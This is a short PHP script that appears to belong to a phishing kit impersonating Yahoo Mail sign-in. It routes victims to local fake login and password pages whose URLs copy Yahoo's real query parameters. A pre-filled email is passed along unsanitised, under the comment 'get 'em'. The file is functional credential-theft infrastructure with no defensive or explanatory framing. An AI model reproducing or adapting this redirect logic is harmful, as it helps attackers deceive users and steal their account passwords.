<?php

if(!isset($_GET["ext"]))
{
  //if no email grabbed. Just go to Login, normal.
  header ('Location: login.php?https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd');
}
else
{
  //get 'em
  $_GET["ext"];
  header ('Location: challenge_password.php?ext_user='.$_GET["ext"].'&ln=src=ym.lang=en-US.intl=us&authMechanism=primary&display=login&done=https%3A%2F%2Fmail.yahoo.com%2Fd&sessionIndex=QQ--&acrumb=u3bTxoYi');
}
?>
